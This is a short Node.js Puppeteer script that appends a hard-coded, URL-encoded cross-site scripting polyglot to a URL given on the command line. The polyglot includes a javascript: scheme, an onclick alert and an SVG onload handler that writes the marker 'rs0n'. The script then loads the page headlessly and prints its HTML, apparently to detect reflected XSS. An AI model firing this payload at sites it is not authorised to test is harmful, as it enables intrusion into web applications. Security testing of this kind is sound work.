const puppeteer = require('puppeteer');

function getHtml(url){
    try {
        (async () => {
            const browser = await puppeteer.launch();
            const page = await browser.newPage();
            try {
                await page.goto(url, {
                    waitUntil: 'networkidle0'
                });
            } catch (error) {
                console.log(error);
                process.exit(1);
            }
            try {
                const data = await page.content();
                console.log(data);
            } catch (error) {
                console.log(error);
                process.exit(1);
            }
            try {
                await browser.close();
            } catch (error) {
                console.log(error);
                process.exit(1);
            }
        })();
    } catch (error) {
        console.log(error);
        process.exit(1);
    }
}

url = process.argv[2]
const payload = url + "jaVasCript%3a%2f%2a%2d%2f%2a%60%2f%2a%5c%60%2f*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0D%0A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=%22(function(){document.body.append(%27rs0n%27);}).call(this)%22//%3E\x3e";
getHtml(payload);